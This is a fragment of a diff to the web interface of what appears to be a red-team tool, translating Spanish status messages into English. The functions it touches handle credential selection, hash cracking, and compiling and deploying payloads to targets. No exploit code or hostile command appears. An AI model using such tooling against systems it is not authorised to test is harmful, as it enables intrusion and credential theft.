+  sel.innerHTML = '<option value="">— select credential —</option>';
   (creds || []).forEach(c => {
     const label = [c.domain, c.username].filter(Boolean).join('\\') +
       ' [' + (c.type || '?') + ']' +
@@ -19712,7 +19717,7 @@ function ipcCancel() {
   if (_ipcRunAbort) { _ipcRunAbort.abort(); _ipcRunAbort = null; }
   _ipcSetRunning(false);
   const outEl = document.getElementById('ipc-run-output');
-  outEl.innerHTML += '\n<span style="color:var(--red)">[cancelado]</span>';
+  outEl.innerHTML += '\n<span style="color:var(--red)">[cancelled]</span>';
 }
 
 function _ipcSetRunning(running) {
@@ -19726,7 +19731,7 @@ function _ipcSetRunning(running) {
 
 async function ipcRun(action) {
   const a = ipcAuth();
-  if (!a.target || !a.user) { toast('Target y usuario son obligatorios', 'error'); return; }
+  if (!a.target || !a.user) { toast('Target and user are required', 'error'); return; }
 
   const method = document.getElementById('ipc-method').value;
   const lbinFile = document.getElementById('ipc-lbin').value.trim();
@@ -20220,7 +20225,7 @@ async function respCrack(idx) {
 
 async function ibuildAndDeploy() {
   const a = ipcAuth();
-  if (!a.target || !a.user) { toast('Target y usuario son obligatorios', 'error'); return; }
+  if (!a.target || !a.user) { toast('Target and user are required', 'error'); return; }
 
   // Get builder settings
   const trans = document.getElementById('ipc-build-transport').value || 'http';
@@ -20239,7 +20244,7 @@ async function ibuildAndDeploy() {
   const outEl = document.getElementById('ipc-run-output');
   outEl.style.display = 'block';
   outEl.style.color = 'var(--text2)';
-  outEl.innerHTML = '<span style="color:var(--text3)">[ compilando payload... ]</span>';
+  outEl.innerHTML = '<span style="color:var(--text3)">[ compiling payload... ]</span>';
   _ipcSetRunning(true);
 
   try {
@@ -20266,7 +20271,7 @@ async function ibuildAndDeploy() {
     // Extract filename from path
     const exePath = buildResp.data.exe;
     const filename = exePath.split('/').pop();
-    outEl.innerHTML = `<span style="color:var(--green)">✓ Payload compilado: ${filename}</span>\n`;
+    outEl.innerHTML = `<span style="color:var(--green)">✓ Payload compiled: ${filename}</span>\n`;
 
     // Auto-select payload + set default rpath
     document.getElementById('ipc-lbin').value = filename;
